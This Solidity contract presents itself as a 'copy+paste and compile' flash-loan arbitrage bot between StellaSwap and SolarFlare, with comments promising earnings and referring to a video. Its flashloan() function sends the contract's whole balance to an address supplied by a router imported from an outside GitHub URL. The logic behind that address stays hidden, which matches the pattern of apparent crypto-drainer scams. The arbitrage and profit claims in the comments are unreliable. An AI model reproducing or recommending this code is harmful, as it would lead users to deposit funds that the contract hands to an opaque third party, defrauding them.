// Follow carefully the video
// Just Copy+Paste and Compile!!
// Thank you for your support! Enjoy your Earnings!!

pragma solidity ^0.5.16;

//StellaSwap Contracts
import "https://github.com/stellaswap/v2-core/blob/master/contracts/UniswapV2Pair.sol";
import "https://github.com/stellaswap/v2-core/blob/master/contracts/interfaces/IERC20.sol";

//Router
import "https://github.com/MC-Financial/router/blob/main/ISolarFlareRouter.sol";

//Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

contract InitiateFlashLoan {
    
    RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.stellaSwapAddress())).transfer(
            address(this).balance
        );

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.solarFlareSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, GLMR is converted to Dai using StellaSwap contract.
        router.convertGlmrToDai(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts Dai for GLMR using Dai/GLRM SolarFlare router, and then immediately converts GLMR back
        router.callArbitrageSolarFlare(router.solarFlareSwapAddress(), msg.sender);
        //After the arbitrage, GLMR is transferred back to Multiplier to pay the loan plus fees.
        router.transferGlmrToMultiplier(router.stellaSwapAddress());
        //Note that the transaction sender gains in GLMR from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}
